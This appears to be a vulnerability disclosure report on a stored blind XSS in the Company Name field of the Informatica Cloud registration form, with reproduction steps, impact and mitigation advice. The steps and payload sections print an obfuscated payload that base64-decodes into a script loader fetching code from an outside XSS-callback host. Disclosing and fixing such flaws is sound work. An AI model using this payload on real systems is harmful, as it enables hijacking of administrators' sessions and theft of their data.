# Blind Cross-Site Scripting (Blind XSS) in Informatica Cloud Registration

## Summary

I identified a Blind Cross-Site Scripting (Blind XSS) vulnerability in the **Company Name** field of the Informatica Cloud registration form.

The application stores user-supplied input from the **Company Name** field without properly sanitizing or encoding it before rendering it on the administrator dashboard. By submitting a malicious payload during registration, arbitrary JavaScript is stored in the application's database and executed when an administrator views the recent registrations.

The vulnerability was confirmed by receiving a callback from the XSS monitoring service after the administrator viewed the dashboard.

## Vulnerability Type

**Blind Cross-Site Scripting (Blind XSS)**

## Vulnerable Field

```text
Company Name
```

## Steps to Reproduce

1. Open the **Informatica Cloud** registration page.

2. In the **Company Name** field, enter the following Blind XSS payload:

   ```html
   "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL25vazEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
   ```

3. Complete the remaining registration fields and submit the registration form.

4. Log in as an administrator and open the **Dashboard**.

5. Observe that the submitted **Company Name** is displayed under the **Recent Registrations** section.

6. The stored payload executes automatically when the dashboard is rendered.

7. A callback is received from the configured XSS monitoring service, confirming successful JavaScript execution.

## Payload Used

```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL25vazEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

## Proof of Concept

The payload was successfully stored in the application's database through the **Company Name** field during registration.

When the administrator logged in and viewed the **Dashboard**, the stored Company Name was rendered under the **Recent Registrations** section. The injected JavaScript executed automatically and generated a callback to the configured XSS monitoring service.

The callback confirmed successful execution in the administrator's browser and included details such as the requested URL, user agent, referrer, origin, and session-related information available to the executing script.

A recorded demonstration and the callback details from the XSS monitoring service confirm successful exploitation of the Blind XSS vulnerability.


https://github.com/user-attachments/assets/bb5508c0-ad1c-4336-97fb-75dec8e8f31f


## Impact

An attacker can store a malicious payload that executes when an administrator or another privileged user views the affected page. This could allow an attacker to execute arbitrary JavaScript in the administrator's browser, access sensitive information available to the administrator's session, or perform actions on behalf of the administrator.

## Recommendation

To mitigate this vulnerability:

- Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML.
- Validate and sanitize user input before storing it in the database.
- Apply context-aware output encoding whenever stored user input is rendered.
- Deploy a strong Content Security Policy (CSP) to reduce the impact of XSS vulnerabilities.
- Deploy a Web Application Firewall (WAF), such as Cloudflare WAF, to help detect and block malicious XSS payloads.
